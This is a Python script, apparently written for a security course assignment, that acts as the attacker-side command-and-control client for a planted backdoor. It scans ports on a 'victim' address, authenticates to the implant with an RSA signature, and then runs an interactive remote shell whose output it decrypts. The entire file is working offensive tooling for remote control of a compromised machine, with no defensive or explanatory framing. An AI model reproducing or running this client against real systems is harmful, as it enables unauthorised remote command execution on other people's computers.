from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
import socket
import sys

INIT_MESSAGE = b'This message will be signed and verified'
BASE_PORT = 1234
VICTIM_IP = '10.0.2.15'

# on the attacker machine
# sending information to the backdoor.py script

# look at the rubric and piazza
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def _authenticate(message = INIT_MESSAGE):
    auth = False
    with open("privkey.pem", "rb") as key_file:
        priv = serialization.load_pem_private_key(
            key_file.read(),
            password=None,
        )
        signature = priv.sign(
            message,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )

        s.send(signature)
        s.send(message)

        success = s.recv(4096)
        auth = success == b'success'
    return auth, priv

def _connect(host = VICTIM_IP, port = BASE_PORT):
    try:
        s.connect((host, port))
    except Exception as e:
        return False
    return True

def find_victim(host = VICTIM_IP, port = BASE_PORT):
    while port < 9999:
        print(f"[CNCServer] Trying to connect to port {port}.")
        ok = _connect(host, port)
        if ok:
            print(f"[CNCServer] Connected and authenticating port {port}.")
            ok, priv = _authenticate()
            if ok:
                print(f"[CNCServer] Authenticated succeeded port {port}.")
                return priv
            else:
                print(f"[CNCServer] Authenticated failed port {port}.")
        port += 1
    return None

def remote_shell(priv):
    print("[CNCServer] Type 'exit' to exit terminal. Starting terminal...")

    while True:
        cmd = input("$: ")
        if(cmd == "exit"):
            s.close()
            break
        else:
            s.send(cmd.encode('utf-8'))
        output = s.recv(4096)
        output = priv.decrypt(
            output,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        print(output.decode())

# connect to victim
priv = find_victim()

# write commands to backdoor
remote_shell(priv)

